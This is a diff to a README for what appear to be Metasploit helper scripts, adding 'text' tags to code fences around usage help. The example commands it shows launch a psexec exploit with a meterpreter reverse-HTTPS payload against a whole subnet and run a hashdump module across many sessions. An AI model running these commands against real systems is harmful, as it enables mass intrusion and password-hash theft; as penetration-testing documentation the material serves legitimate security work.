@@ -17,14 +17,14 @@ Run a given exploit against multiple targets.
 
 Example:
 
-```
+```text
 $ ./multisploit.py -e windows/smb/psexec -p windows/meterpreter/reverse_https \
 -t 192.168.1.0/24 --handler-opts='LHOST=192.168.1.16,LPORT=443'
 ```
 
 Full help:
 
-```
+```text
 usage: multisploit.py [-h] -e EXPLOIT -p PAYLOAD -t TARGETS
                       [--handler-opts OPTIONS] [--exploit-opts OPTIONS]
                       [--rpc-host HOST] [--rpc-port PORT] [--rpc-user USER]
@@ -59,13 +59,13 @@ Run a given `post` module against multiple sessions.
 
 Example:
 
-```
+```text
 $ ./multipost.py -m windows/gather/hashdump -s 1-10,12,14-18
 ```
 
 Full help:
 
-```
+```text
 usage: multipost.py [-h] -m MODULE -s SESSIONS [--opts OPTS] [--rpc-host HOST]
                     [--rpc-port PORT] [--rpc-user USER] [--rpc-passwd PASSWD]
                     [--rpc-ssl]
